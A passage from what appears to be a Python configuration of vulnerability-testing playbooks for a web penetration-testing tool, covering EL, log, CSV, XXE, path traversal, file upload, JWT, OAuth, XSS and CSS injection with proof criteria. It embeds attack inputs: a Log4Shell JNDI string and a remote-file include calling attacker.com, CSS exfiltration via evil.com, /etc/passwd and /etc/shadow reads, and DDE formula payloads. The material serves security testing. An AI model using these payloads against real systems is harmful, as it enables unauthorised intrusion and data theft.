            "STEP 3 - FINGERPRINT ENGINE: Test JSP EL (${...}), JSF (#{...}), Spring SpEL (${...})",
            "STEP 4 - ESCALATE: Use engine-specific RCE chains (Runtime.exec, ProcessBuilder)",
            "STEP 5 - EXECUTE COMMAND: Achieve OS command execution via EL evaluation",
            "STEP 6 - PROVE: Show OS command output from EL injection"
        ],
        "decision_criteria": {
            "confirmed": "EL expression evaluated server-side: arithmetic result or command output visible",
            "likely": "Arithmetic evaluated but RCE not achieved (sandbox/restrictions)",
            "rejected": "EL syntax returned literally, or client-side template evaluation"
        },
        "proof_requirements": [
            "Server-side evaluation: ${7*7} → 49 in response (not client-side JS)",
            "Must distinguish from SSTI (EL injection is Java-specific)",
            "For RCE: show OS command output that couldn't come from application logic"
        ],
        "common_pitfalls": [
            "Client-side ${...} in JavaScript frameworks is NOT EL injection",
            "Modern Java EE containers restrict EL method access by default",
            "Spring Security may block certain EL patterns"
        ]
    },

    "log_injection": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY LOGGING: Find parameters likely logged (usernames, search queries, User-Agent)",
            "STEP 2 - INJECT NEWLINES: Send \\n, \\r\\n, %0a, %0d%0a in parameters",
            "STEP 3 - FORGE LOG ENTRIES: Craft fake log entries matching log format",
            "STEP 4 - TEST LOG4J: If Java, test ${jndi:ldap://attacker.com/x} (Log4Shell)",
            "STEP 5 - CHECK IMPACT: Can forged entries trigger alerts, hide attacks, or achieve RCE?",
            "STEP 6 - PROVE: Show forged log entry or JNDI callback received"
        ],
        "decision_criteria": {
            "confirmed": "JNDI callback received (Log4Shell), or demonstrable log forging visible in logs",
            "likely": "Newlines accepted in logged parameters but can't view logs",
            "rejected": "Input sanitized before logging, or no JNDI callback received"
        },
        "proof_requirements": [
            "Log4Shell: DNS/LDAP callback from target server confirms JNDI evaluation",
            "Log forging: ideally show the forged log entry (requires log access)",
            "Without log access: response timing with JNDI can indicate processing"
        ],
        "common_pitfalls": [
            "Most log injection requires LOG ACCESS to verify (often not available in black-box)",
            "Log4j patched in most modern systems (2.17.1+)",
            "Newline in parameter doesn't guarantee log injection (backend may sanitize)"
        ]
    },

    "html_injection": {
        "reasoning_chain": [
            "STEP 1 - FIND REFLECTION: Locate input reflected in HTML response body",
            "STEP 2 - INJECT HTML: Send <b>test</b>, <h1>injected</h1>, <img src=x>",
            "STEP 3 - CHECK RENDERING: Does injected HTML render in the page (not escaped)?",
            "STEP 4 - TEST IMPACT: Can you inject forms, links, or content that deceives users?",
            "STEP 5 - DISTINGUISH FROM XSS: HTML injection WITHOUT script execution",
            "STEP 6 - PROVE: Show rendered HTML that could deceive or phish users"
        ],
        "decision_criteria": {
            "confirmed": "Injected HTML tags render in page (visible formatting, images, forms)",
            "likely": "Some HTML tags render but limited impact (no forms/links)",
            "rejected": "All HTML encoded, tags stripped, or only text rendered"
        },
        "proof_requirements": [
            "Must show RENDERED HTML in browser (not just unescaped source)",
            "Higher impact: phishing forms, fake login, deceptive content",
            "Distinguish from XSS: HTML injection = no JavaScript execution"
        ],
        "common_pitfalls": [
            "HTML entities showing in source but rendered normally = proper encoding",
            "Markdown rendering is not HTML injection",
            "Some tags allowed by design (rich text editors)"
        ]
    },

    "csv_injection": {
        "reasoning_chain": [
            "STEP 1 - FIND EXPORTS: Locate CSV/Excel export functionality",
            "STEP 2 - INJECT FORMULAS: Submit =cmd|'/C calc'!A0, =HYPERLINK(), +cmd in input fields",
            "STEP 3 - EXPORT AND CHECK: Download exported CSV, check if formula preserved",
            "STEP 4 - OPEN IN EXCEL: Does spreadsheet app evaluate the formula?",
            "STEP 5 - TEST DDE: Try =DDE('cmd','/C calc','') for Dynamic Data Exchange",
            "STEP 6 - PROVE: Show formula execution when opening exported CSV in Excel"
        ],
        "decision_criteria": {
            "confirmed": "Formula preserved in export AND executes when opened in spreadsheet application",
            "likely": "Formula preserved in CSV but execution requires user interaction/enabling macros",
            "rejected": "Formulas escaped (prepended with '), stripped, or not preserved in export"
        },
        "proof_requirements": [
            "Must show formula preserved in downloaded CSV file",
            "Best: demonstrate execution in Excel/LibreOffice Calc",
            "Note: modern Excel shows security warnings (reduces severity)"
        ],
        "common_pitfalls": [
            "Stored formula in DB but escaped on export = NOT vulnerable",
            "Modern Excel blocks DDE by default (lower severity)",
            "CSV injection is often disputed as vulnerability (depends on context)"
        ]
    },

    "orm_injection": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY ORM: Detect ORM framework (Hibernate, SQLAlchemy, ActiveRecord, Sequelize)",
            "STEP 2 - FIND DYNAMIC QUERIES: Look for endpoints using user input in ORM queries",
            "STEP 3 - TEST MANIPULATION: Inject ORM-specific syntax (HQL, JPQL, Criteria API params)",
            "STEP 4 - BYPASS ORM SAFETY: Test raw query escapes, native queries, order-by injection",
            "STEP 5 - EXTRACT DATA: Use ORM query manipulation to access unintended data",
            "STEP 6 - PROVE: Show data access beyond ORM model constraints"
        ],
        "decision_criteria": {
            "confirmed": "ORM query manipulated to return data outside intended model scope",
            "likely": "ORM error reveals query structure but no data extraction",
            "rejected": "ORM parameterization prevents injection, input validated"
        },
        "proof_requirements": [
            "Must show ORM query manipulation (not just SQL injection through ORM)",
            "HQL/JPQL injection: show entity traversal or cross-model data access",
            "Order-by injection: show controllable sorting revealing data"
        ],
        "common_pitfalls": [
            "ORM error with query fragment ≠ injectable (might be debug info)",
            "Most ORMs parameterize by default - injection requires explicit raw queries",
            "Order-by is often the only injectable point in well-coded ORM usage"
        ]
    },

    # ── File Access Vulnerabilities ───────────────────────────────

    "rfi": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY INCLUDES: Find parameters loading files (page=, include=, template=)",
            "STEP 2 - TEST REMOTE URL: Set parameter to http://attacker.com/malicious.php",
            "STEP 3 - CHECK CALLBACK: Did target server request our file? (check web server logs)",
            "STEP 4 - TEST WRAPPERS: Try data://, expect://, php://input with POST body",
            "STEP 5 - CHECK EXECUTION: Is the remote file executed server-side?",
            "STEP 6 - PROVE: Show remote code execution via included external file"
        ],
        "decision_criteria": {
            "confirmed": "Remote file fetched AND executed server-side (command output visible)",
            "likely": "Remote file fetched but execution not confirmed (content reflected only)",
            "rejected": "Remote URLs blocked, only local files allowed, allow_url_include=Off"
        },
        "proof_requirements": [
            "Must show server fetched remote URL (HTTP callback in logs)",
            "For RCE: show PHP/code execution output from included file",
            "Distinguish from SSRF: RFI = code inclusion/execution, SSRF = request making"
        ],
        "common_pitfalls": [
            "PHP allow_url_include disabled by default since PHP 5.2",
            "File inclusion without execution is SSRF, not RFI",
            "Including HTML file that renders is HTML injection, not RFI"
        ]
    },

    "path_traversal": {
        "reasoning_chain": [
            "STEP 1 - FIND FILE PARAMS: Locate parameters referencing files (filename=, path=, doc=)",
            "STEP 2 - TEST TRAVERSAL: Send ../../../etc/passwd, ....//....//etc/passwd",
            "STEP 3 - TEST ENCODING: Try %2e%2e%2f, ..%252f, %c0%ae%c0%ae/ double encoding",
            "STEP 4 - VERIFY CONTENT: Response must contain actual file content",
            "STEP 5 - MAP FILESYSTEM: Read application configs, source code, credentials",
            "STEP 6 - PROVE: Show sensitive file content from outside application directory"
        ],
        "decision_criteria": {
            "confirmed": "File content from outside web root visible (e.g., /etc/passwd, win.ini)",
            "likely": "Error reveals filesystem path but no content read",
            "rejected": "Path normalized, traversal blocked, or chroot prevents escape"
        },
        "proof_requirements": [
            "File content must be recognizable (not just different response size)",
            "Show content from OUTSIDE the web application directory",
            "For Windows: ....\\\\....\\\\windows\\\\win.ini or similar"
        ],
        "common_pitfalls": [
            "Path in error message ≠ file read (just information disclosure)",
            "Relative path within application directory may be intended",
            "Chroot/containerization may limit traversal scope"
        ]
    },

    "file_upload": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY UPLOAD: Find file upload forms (profile pictures, documents, attachments)",
            "STEP 2 - TEST EXTENSION BYPASS: Upload .php, .php5, .phtml, .jsp, .aspx with web shell content",
            "STEP 3 - TEST CONTENT-TYPE: Change Content-Type header to image/jpeg while uploading script",
            "STEP 4 - TEST DOUBLE EXTENSION: Try file.php.jpg, file.php%00.jpg, file.php;.jpg",
            "STEP 5 - FIND UPLOADED FILE: Locate where file is stored and if it's web-accessible",
            "STEP 6 - PROVE: Access uploaded file via URL and show server-side code execution"
        ],
        "decision_criteria": {
            "confirmed": "Uploaded script executed server-side when accessed via URL",
            "likely": "Script uploaded successfully but execution not confirmed (can't find URL)",
            "rejected": "Upload rejected, file renamed to safe extension, or stored outside web root"
        },
        "proof_requirements": [
            "Must show BOTH: 1) File uploaded 2) Code executes when accessed",
            "For RCE: OS command output from uploaded web shell",
            "For XSS: uploaded HTML/SVG rendering with script execution"
        ],
        "common_pitfalls": [
            "File uploaded but stored in non-web-accessible directory = no direct impact",
            "Server renames file to .txt or adds random prefix = lower risk",
            "Image processing libraries may strip embedded code"
        ]
    },

    "arbitrary_file_read": {
        "reasoning_chain": [
            "STEP 1 - FIND FILE PARAMETERS: Locate any parameter that references files on disk",
            "STEP 2 - TEST ABSOLUTE PATHS: Try /etc/passwd, /etc/shadow, C:\\Windows\\win.ini",
            "STEP 3 - TEST SYMLINK TRAVERSAL: Upload symlink pointing to sensitive file",
            "STEP 4 - READ APP CONFIG: Target .env, database.yml, config.php, web.config",
            "STEP 5 - READ CREDENTIALS: Target credential files, SSH keys, API keys",
            "STEP 6 - PROVE: Show sensitive file content (credentials, configs, system files)"
        ],
        "decision_criteria": {
            "confirmed": "Sensitive file content returned (credentials, system files, configs)",
            "likely": "File content returned but not yet sensitive (non-critical files)",
            "rejected": "File read blocked, path restricted, or permission denied"
        },
        "proof_requirements": [
            "Must show actual file content (not just 200 response)",
            "Content must be recognizable (config format, /etc/passwd lines, etc.)",
            "Higher impact: credentials, API keys, private keys"
        ],
        "common_pitfalls": [
            "200 response with no file content = server didn't process the path",
            "Reading application's own static files is usually intended",
            "Container/chroot may limit file access scope"
        ]
    },

    "xxe": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY XML: Find endpoints accepting XML (Content-Type: text/xml, SOAP, RSS, SVG upload)",
            "STEP 2 - TEST ENTITY: Inject <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><foo>&xxe;</foo>",
            "STEP 3 - CHECK RESPONSE: Does entity value appear in response? (file content or error with path)",
            "STEP 4 - READ FILES: Try /etc/passwd, application config files",
            "STEP 5 - TEST OOB: If no direct output, try out-of-band (XXE to external DTD with data exfil)",
            "STEP 6 - PROVE: Show file content extracted via XML entity expansion"
        ],
        "decision_criteria": {
            "confirmed": "File content extracted via entity (hostname, /etc/passwd content visible)",
            "likely": "XML parser error reveals file path or entity processing",
            "rejected": "XML rejected, entities disabled, or no entity processing observed"
        },
        "proof_requirements": [
            "Entity must resolve to actual file content (not just be parsed)",
            "OOB: DNS/HTTP callback with data confirms blind XXE",
            "Error-based: XML error must show file content in error message"
        ],
        "common_pitfalls": [
            "Modern XML parsers disable external entities by default",
            "JSON endpoints with XML Content-Type might not parse XML at all",
            "SVG/DOCX XXE requires file upload, not direct injection"
        ]
    },

    "zip_slip": {
        "reasoning_chain": [
            "STEP 1 - FIND UPLOAD: Locate archive upload (ZIP, TAR, JAR) functionality",
            "STEP 2 - CRAFT ARCHIVE: Create ZIP with path traversal entries (../../etc/cron.d/malicious)",
            "STEP 3 - UPLOAD ARCHIVE: Submit the crafted archive for server-side extraction",
            "STEP 4 - CHECK EXTRACTION: Does the server extract files to traversed paths?",
            "STEP 5 - VERIFY WRITE: Confirm file written outside intended directory",
            "STEP 6 - PROVE: Show file written to arbitrary path (web shell, cron job, config overwrite)"
        ],
        "decision_criteria": {
            "confirmed": "File written to path outside extraction directory (web shell accessible, config overwritten)",
            "likely": "Archive accepted but can't verify extraction behavior",
            "rejected": "Server validates/sanitizes file paths in archive, or rejects traversal entries"
        },
        "proof_requirements": [
            "Must show file written OUTSIDE intended extraction directory",
            "Best: access written file via URL or see its effect (cron execution, config change)",
            "Alternative: error message revealing write attempt to traversed path"
        ],
        "common_pitfalls": [
            "Archive uploaded but not auto-extracted = no Zip Slip",
            "Server may extract to temp directory then move (sanitizing paths)",
            "Container filesystem may limit impact of path traversal"
        ]
    },

    # ── Authentication ────────────────────────────────────────────

    "auth_bypass": {
        "reasoning_chain": [
            "STEP 1 - MAP AUTH: Identify authentication endpoints (login, register, password reset)",
            "STEP 2 - TEST WITHOUT AUTH: Access protected endpoints without any credentials",
            "STEP 3 - TEST MODIFIED TOKENS: Tamper with session cookies, JWT claims, auth headers",
            "STEP 4 - TEST ALTERNATIVE AUTH: Try different auth methods (Basic, Bearer, API key, cookie)",
            "STEP 5 - VERIFY ACCESS: Confirm you accessed protected functionality",
            "STEP 6 - PROVE: Show protected data/functionality accessible without valid auth"
        ],
        "decision_criteria": {
            "confirmed": "Protected endpoint returns sensitive data/functionality without valid credentials",
            "likely": "200 response without auth but can't verify if data is actually protected",
            "rejected": "Properly redirected to login, 401/403 returned, or public data"
        },
        "proof_requirements": [
            "Must show data/functionality that requires authentication is accessible without it",
            "Compare authenticated vs unauthenticated response - must show difference in access",
            "For token manipulation: show modified token accepted with elevated access"
        ],
        "common_pitfalls": [
            "Public endpoints returning 200 = NOT auth bypass (they're meant to be public)",
            "Login page returning 200 = normal behavior (it shows the login form)",
            "Health check / status endpoints are intentionally unauthenticated"
        ]
    },

    "session_fixation": {
        "reasoning_chain": [
            "STEP 1 - GET SESSION: Obtain a session ID before authentication",
            "STEP 2 - AUTHENTICATE: Login with valid credentials using the pre-auth session",
            "STEP 3 - CHECK SESSION: Does the session ID CHANGE after authentication?",
            "STEP 4 - TEST FIXATION: If session unchanged, can attacker set it for victim?",
            "STEP 5 - VERIFY HIJACK: Use pre-auth session to access post-auth resources",
            "STEP 6 - PROVE: Show pre-auth session grants authenticated access after victim logs in"
        ],
        "decision_criteria": {
            "confirmed": "Session ID unchanged after login AND pre-auth session grants authenticated access",
            "likely": "Session ID unchanged but can't verify cross-user fixation",
            "rejected": "Session regenerated on login, or session bound to IP/fingerprint"
        },
        "proof_requirements": [
            "Show session cookie value is identical before and after authentication",
            "Demonstrate the pre-auth session has authenticated privileges",
            "Ideally: two browsers, one sets session, other uses it after login"
        ],
        "common_pitfalls": [
            "Some frameworks regenerate session but keep same cookie name (check VALUE)",
            "Session fixation requires ability to SET the session (cookie injection vector)",
            "Modern frameworks regenerate sessions on auth by default"
        ]
    },

    "default_credentials": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY SERVICES: Find login panels, admin interfaces, database panels",
            "STEP 2 - DETECT SOFTWARE: Identify the software/device (router, CMS, database, etc.)",
            "STEP 3 - LOOKUP DEFAULTS: Check known default credentials for detected software",
            "STEP 4 - TEST CREDENTIALS: Try default username:password combinations",
            "STEP 5 - VERIFY ACCESS: Confirm successful authentication with default creds",
            "STEP 6 - PROVE: Show authenticated session with default credentials"
        ],
        "decision_criteria": {
            "confirmed": "Logged in successfully with default/known credentials",
            "likely": "Default credentials not rejected but can't verify full access",
            "rejected": "Default credentials changed, account locked, or MFA required"
        },
        "proof_requirements": [
            "Must show successful login (authenticated page content, not just 200 status)",
            "Show what access level the default credentials provide",
            "Document which default credentials worked"
        ],
        "common_pitfalls": [
            "Test/demo instances with intended default creds = expected behavior",
            "Honeypot login pages that accept anything = NOT default creds",
            "Account lockout after N attempts may prevent testing"
        ]
    },

    "two_factor_bypass": {
        "reasoning_chain": [
            "STEP 1 - MAP 2FA FLOW: Understand the two-factor authentication process",
            "STEP 2 - TEST DIRECT ACCESS: Skip 2FA step, access protected pages directly",
            "STEP 3 - TEST CODE MANIPULATION: Try null, empty, 000000, bruteforce short codes",
            "STEP 4 - TEST RACE CONDITION: Submit multiple 2FA codes simultaneously",
            "STEP 5 - TEST ALTERNATE PATHS: Use password reset, API endpoints to bypass 2FA",
            "STEP 6 - PROVE: Show full authenticated access without completing 2FA"
        ],
        "decision_criteria": {
            "confirmed": "Fully authenticated session obtained without valid 2FA code",
            "likely": "2FA step skippable but protected content unclear",
            "rejected": "2FA properly enforced, all bypass attempts blocked"
        },
        "proof_requirements": [
            "Must show protected content/functionality accessible without valid 2FA",
            "Compare with normal 2FA flow to prove the bypass",
            "For brute force: show successful code guess within rate limit"
        ],
        "common_pitfalls": [
            "2FA not required for certain endpoints = design choice, not bypass",
            "Remember-me token skipping 2FA = intended functionality",
            "API tokens generated before 2FA enabled may bypass it by design"
        ]
    },

    "oauth_misconfiguration": {
        "reasoning_chain": [
            "STEP 1 - MAP OAUTH FLOW: Identify OAuth provider, grant type, redirect URIs",
            "STEP 2 - TEST REDIRECT: Modify redirect_uri to attacker domain",
            "STEP 3 - TEST STATE: Remove or reuse state parameter (CSRF in OAuth)",
            "STEP 4 - TEST SCOPE: Request elevated scopes not intended for the app",
            "STEP 5 - TEST TOKEN LEAKAGE: Check if tokens leak via referer, URL fragments",
            "STEP 6 - PROVE: Show token theft via redirect manipulation or scope escalation"
        ],
        "decision_criteria": {
            "confirmed": "OAuth token/code redirected to attacker domain, or scope escalation achieved",
            "likely": "Redirect URI validation weak but token not yet captured",
            "rejected": "Strict redirect URI validation, state checked, scopes limited"
        },
        "proof_requirements": [
            "For redirect: show authorization code/token sent to attacker URL",
            "For state bypass: show CSRF-able OAuth flow",
            "For scope: show elevated permissions granted beyond intended"
        ],
        "common_pitfalls": [
            "Open redirect in redirect_uri subdomain ≠ full OAuth misconfiguration",
            "Implicit grant (token in fragment) doesn't send token to redirect server",
            "Some OAuth implementations allow localhost for development (not vuln in prod)"
        ]
    },

    "jwt_manipulation": {
        "reasoning_chain": [
            "STEP 1 - DECODE JWT: Extract header (algorithm) and payload (claims)",
            "STEP 2 - TEST NONE ALGORITHM: Set alg:none, strip signature",
            "STEP 3 - TEST KEY CONFUSION: RS256→HS256 with public key as HMAC secret",
            "STEP 4 - TEST WEAK SECRET: Crack HS256 with common wordlists (hashcat/jwt_tool)",
            "STEP 5 - MODIFY CLAIMS: Change sub, role, admin, exp claims",
            "STEP 6 - PROVE: Show server accepts modified JWT with different user/role access"
        ],
        "decision_criteria": {
            "confirmed": "Modified JWT accepted, granting access as different user or elevated role",
            "likely": "Algorithm confusion/none accepted but claim changes not verified",
            "rejected": "Server validates signature, rejects modified tokens"
        },
        "proof_requirements": [
            "Must show DIFFERENT behavior with modified JWT (not just 200 status)",
            "Compare: original JWT response vs modified JWT response",
            "For none alg: unsigned token must change server behavior"
        ],
        "common_pitfalls": [
            "Server returning same response for any JWT = might ignore JWT entirely",
            "Expired JWT errors are normal JWT validation, not vulnerability",
            "kid parameter injection might not lead to practical exploitation"
        ]
    },

    # ── Authorization ─────────────────────────────────────────────

    "mass_assignment": {
        "reasoning_chain": [
            "STEP 1 - MAP MODELS: Identify user/object creation and update endpoints",
            "STEP 2 - FIND HIDDEN FIELDS: Look for undocumented fields (role, isAdmin, verified, plan)",
            "STEP 3 - INJECT FIELDS: Add extra fields to POST/PUT/PATCH requests",
            "STEP 4 - CHECK ACCEPTANCE: Were the extra fields accepted and stored?",
            "STEP 5 - VERIFY EFFECT: Did the mass-assigned field change behavior?",
            "STEP 6 - PROVE: Show privilege change or data modification via extra fields"
        ],
        "decision_criteria": {
            "confirmed": "Extra field accepted AND resulted in privilege change or unauthorized modification",
            "likely": "Field accepted in response but effect not verified",
            "rejected": "Extra fields ignored, stripped, or whitelisted fields only"
        },
        "proof_requirements": [
            "Must show the extra field was STORED (not just accepted)",
            "Must show EFFECT of the assigned field (elevated role, verified status, etc.)",
            "Compare before/after: what changed due to the mass-assigned field"
        ],
        "common_pitfalls": [
            "Field accepted in response but not stored in database = NOT mass assignment",
            "Field stored but has no security effect = low severity",
            "Some APIs echo back all received fields without storing them"
        ]
    },

    "forced_browsing": {
        "reasoning_chain": [
            "STEP 1 - ENUMERATE PATHS: Brute force directories and files with wordlists",
            "STEP 2 - FIND HIDDEN RESOURCES: Locate admin panels, backup files, config files",
            "STEP 3 - TEST ACCESS: Can discovered resources be accessed without authentication?",
            "STEP 4 - CHECK SENSITIVE DATA: Do hidden resources contain sensitive information?",
            "STEP 5 - TEST AUTH LEVELS: Access admin resources with regular user credentials",
            "STEP 6 - PROVE: Show sensitive resources accessible via direct URL access"
        ],
        "decision_criteria": {
            "confirmed": "Sensitive resource accessible via direct URL without proper authorization",
            "likely": "Hidden resource found but sensitivity not determined",
            "rejected": "All sensitive resources properly protected, returns 403/401"
        },
        "proof_requirements": [
            "Must show the resource is sensitive (admin panel, backup, config, user data)",
            "Must show it's accessible without proper authorization",
            "Directory listing alone is informational unless containing sensitive files"
        ],
        "common_pitfalls": [
            "Public pages found via directory brute force = NOT forced browsing",
            "robots.txt entries are informational, not necessarily sensitive",
            "404 custom pages returning 200 = false positive in enumeration"
        ]
    },

    # ── Client-Side ───────────────────────────────────────────────

    "clickjacking": {
        "reasoning_chain": [
            "STEP 1 - CHECK HEADERS: Does response include X-Frame-Options or CSP frame-ancestors?",
            "STEP 2 - TEST IFRAME: Create page with <iframe src='target'> - does it load?",
            "STEP 3 - IDENTIFY ACTIONS: Find clickable actions (delete, transfer, settings change)",
            "STEP 4 - BUILD OVERLAY: Position transparent iframe over attacker-controlled content",
            "STEP 5 - TEST USER ACTION: Can a click on attacker page trigger action on target?",
            "STEP 6 - PROVE: Show sensitive action triggerable through clickjacking"
        ],
        "decision_criteria": {
            "confirmed": "Target loads in iframe AND sensitive action can be triggered via clicking",
            "likely": "Target loads in iframe but no sensitive action identified",
            "rejected": "X-Frame-Options DENY/SAMEORIGIN, or CSP frame-ancestors blocks framing"
        },
        "proof_requirements": [
            "Must show target page renders in iframe on attacker domain",
            "Must identify a security-sensitive action that can be triggered",
            "HTML PoC demonstrating the clickjacking attack"
        ],
        "common_pitfalls": [
            "Static/public pages frameable = low impact, not meaningful clickjacking",
            "Login pages are often intentionally frameable for SSO",
            "Frame-busting JavaScript can be bypassed with sandbox attribute"
        ]
    },

    "xss_dom": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY SOURCES: Find DOM sources (location.hash, location.search, document.referrer, postMessage)",
            "STEP 2 - TRACE FLOW: Follow data from source through code to sink",
            "STEP 3 - IDENTIFY SINKS: innerHTML, outerHTML, document.write, eval, jQuery.html()",
            "STEP 4 - TEST INJECTION: Inject payload via source (URL fragment, query param)",
            "STEP 5 - VERIFY EXECUTION: Check if payload reaches sink and executes in browser",
            "STEP 6 - PROVE: Browser executes injected script via DOM manipulation"
        ],
        "decision_criteria": {
            "confirmed": "Script executes in browser via DOM source→sink flow (no server reflection needed)",
            "likely": "Source reaches sink but encoding/sanitization prevents execution",
            "rejected": "No source→sink flow, or DOMPurify/sanitization blocks all payloads"
        },
        "proof_requirements": [
            "Must show the SOURCE→SINK data flow in JavaScript",
            "Browser execution is mandatory (Playwright or manual browser test)",
            "This is CLIENT-SIDE only: server response doesn't contain the payload"
        ],
        "common_pitfalls": [
            "Payload in URL that server reflects is REFLECTED XSS, not DOM XSS",
            "Some frameworks auto-sanitize DOM operations (React, Angular)",
            "DOMPurify blocks most attacks - test for bypasses"
        ]
    },

    "blind_xss": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY STORAGE: Find input stored and viewed by OTHER users (admin panels, support tickets)",
            "STEP 2 - INJECT CALLBACK: Insert XSS payload with external callback (img/script to your server)",
            "STEP 3 - TARGET ADMIN: Submit payload that will render in admin/backend interface",
            "STEP 4 - WAIT FOR TRIGGER: Monitor callback server for incoming requests",
            "STEP 5 - ANALYZE CALLBACK: Check if callback includes cookies, page content, screenshots",
            "STEP 6 - PROVE: Show callback received from target with admin session data"
        ],
        "decision_criteria": {
            "confirmed": "Callback received from target domain with admin session/cookie data",
            "likely": "Input accepted and stored but callback not yet received",
            "rejected": "Input sanitized, CSP blocks external loads, no callback received"
        },
        "proof_requirements": [
            "Must receive callback on attacker-controlled server from target domain",
            "Callback should include evidence: cookies, screenshot, DOM content, URL",
            "Timestamp of callback correlated with submission"
        ],
        "common_pitfalls": [
            "Blind XSS may take hours/days for admin to view - patience required",
            "CSP can block external resource loading even if XSS exists",
            "Some backends render data as text, not HTML"
        ]
    },

    "prototype_pollution": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY MERGE: Find endpoints that merge/extend JavaScript objects (settings, config)",
            "STEP 2 - TEST POLLUTION: Send __proto__[polluted]=true or constructor.prototype.polluted=true",
            "STEP 3 - CHECK EFFECT: Does the polluted property affect application behavior?",
            "STEP 4 - CLIENT-SIDE: For client PP, test if polluted property leads to DOM XSS",
            "STEP 5 - SERVER-SIDE: For server PP (Node.js), test for RCE via child_process gadgets",
            "STEP 6 - PROVE: Show security impact via prototype pollution (XSS or RCE)"
        ],
        "decision_criteria": {
            "confirmed": "Polluted property causes security impact (XSS, RCE, auth bypass)",
            "likely": "Prototype polluted (property visible) but no security impact found",
            "rejected": "Object.create(null) used, or input sanitized, or no merge operation"
        },
        "proof_requirements": [
            "Must show both: 1) Prototype pollution occurred 2) Security impact",
            "Pollution without impact = informational only",
            "For XSS: show polluted property used in DOM sink"
        ],
        "common_pitfalls": [
            "Prototype pollution without gadget chain = no practical impact",
            "Modern JS frameworks often use Object.create(null) for config objects",
            "Client-side PP requires finding a usable gadget in the same page"
        ]
    },

    "websocket_hijacking": {
        "reasoning_chain": [
            "STEP 1 - FIND WS: Identify WebSocket endpoints (ws://, wss://)",
            "STEP 2 - CHECK ORIGIN: Does WS handshake validate Origin header?",
            "STEP 3 - TEST CROSS-ORIGIN: Connect from attacker domain to target WebSocket",
            "STEP 4 - CHECK AUTH: Are cookies sent with WS upgrade? Is there token auth?",
            "STEP 5 - SEND MESSAGES: Can cross-origin page send messages to target WS?",
            "STEP 6 - PROVE: Show cross-origin WebSocket connection accessing authenticated data"
        ],
        "decision_criteria": {
            "confirmed": "Cross-origin WebSocket connection accesses authenticated user's data/actions",
            "likely": "WebSocket accepts any Origin but impact not demonstrated",
            "rejected": "Origin validated, or WS requires separate authentication token"
        },
        "proof_requirements": [
            "Must show cross-origin connection to WebSocket succeeds",
            "Must show authenticated data accessible via the hijacked connection",
            "HTML PoC demonstrating the cross-origin WebSocket connection"
        ],
        "common_pitfalls": [
            "WS connection without authentication = public endpoint (not hijacking)",
            "Some WS endpoints accept any origin by design (public data streams)",
            "Token-based WS auth (not cookie) is not vulnerable to CSWSH"
        ]
    },

    "dom_clobbering": {
        "reasoning_chain": [
            "STEP 1 - FIND HTML INJECTION: Locate place where attacker-controlled HTML is rendered",
            "STEP 2 - IDENTIFY TARGETS: Find JS code accessing DOM properties (x.y, window.x)",
            "STEP 3 - INJECT NAMED ELEMENTS: Create elements with name/id matching JS property access",
            "STEP 4 - TEST OVERRIDE: Does HTML element override the expected DOM property?",
            "STEP 5 - TRACE TO SINK: Does overridden property flow to a dangerous sink?",
            "STEP 6 - PROVE: Show XSS or security bypass via DOM clobbering"
        ],
        "decision_criteria": {
            "confirmed": "DOM clobbered property leads to XSS or security control bypass",
            "likely": "Property clobbered but no sink reached",
            "rejected": "Property access uses safe patterns, or CSP blocks execution"
        },
        "proof_requirements": [
            "Must show: 1) HTML injection possible 2) Named element overrides JS property 3) Sink reached",
            "Without all three steps, DOM clobbering has no impact",
            "Full chain from injection → clobber → sink → execution"
        ],
        "common_pitfalls": [
            "DOM clobbering requires HTML injection first (not standalone vuln)",
            "Modern frameworks don't access DOM properties in clobberable ways",
            "DOMPurify default config prevents most clobbering vectors"
        ]
    },

    "postmessage_vulnerability": {
        "reasoning_chain": [
            "STEP 1 - FIND HANDLERS: Search for window.addEventListener('message', ...) in JS",
            "STEP 2 - CHECK ORIGIN: Does handler validate event.origin before processing?",
            "STEP 3 - TRACE DATA: Where does event.data flow? (innerHTML, eval, location?)",
            "STEP 4 - BUILD POC: Create page that iframes target and sends crafted message",
            "STEP 5 - TEST EXECUTION: Does crafted message trigger XSS or action?",
            "STEP 6 - PROVE: Show XSS or unauthorized action via cross-origin postMessage"
        ],
        "decision_criteria": {
            "confirmed": "Cross-origin postMessage leads to XSS or unauthorized action",
            "likely": "Origin not validated but data doesn't reach dangerous sink",
            "rejected": "Origin properly validated, or data sanitized before use"
        },
        "proof_requirements": [
            "Must show: 1) No origin validation 2) Data reaches dangerous sink 3) Impact",
            "HTML PoC that frames target and sends message achieving XSS/action",
            "Origin check bypass (if partial validation) must be demonstrated"
        ],
        "common_pitfalls": [
            "PostMessage handler with origin check = probably safe",
            "Data used in non-dangerous way (logging) = no impact",
            "Some handlers intentionally accept any origin (public API)"
        ]
    },

    "css_injection": {
        "reasoning_chain": [
            "STEP 1 - FIND STYLE INJECTION: Locate input reflected in CSS context (style=, <style> tags)",
            "STEP 2 - INJECT CSS: Test with color:red, background:url(//evil.com), expression()",
            "STEP 3 - TEST DATA EXFIL: Use CSS selectors to extract page content (input[value^='a'])",
            "STEP 4 - TEST IMPORT: Try @import url(//evil.com/steal.css)",
            "STEP 5 - VERIFY IMPACT: Can CSS injection steal CSRF tokens or sensitive data?",
            "STEP 6 - PROVE: Show data extraction or UI manipulation via CSS injection"
        ],
        "decision_criteria": {
            "confirmed": "CSS injection extracts sensitive data (CSRF tokens via attribute selectors)",
            "likely": "CSS injected and renders but no data extraction achieved",
            "rejected": "CSS escaped, style attributes stripped, or CSP blocks injection"
        },
        "proof_requirements": [
            "Must show injected CSS renders in page (visible style change)",
            "For data exfil: show CSS selector + background URL extracting data",
            "Higher impact requires data theft, not just visual defacement"
        ],
        "common_pitfalls": [
            "Visual-only CSS changes = low impact (defacement, not security)",
            "CSP can block external resource loading from CSS",
            "Modern browsers don't support CSS expression() (IE-only)"
        ]
    },

    "tabnabbing": {
        "reasoning_chain": [
            "STEP 1 - FIND LINKS: Locate links with target='_blank' or window.open()",
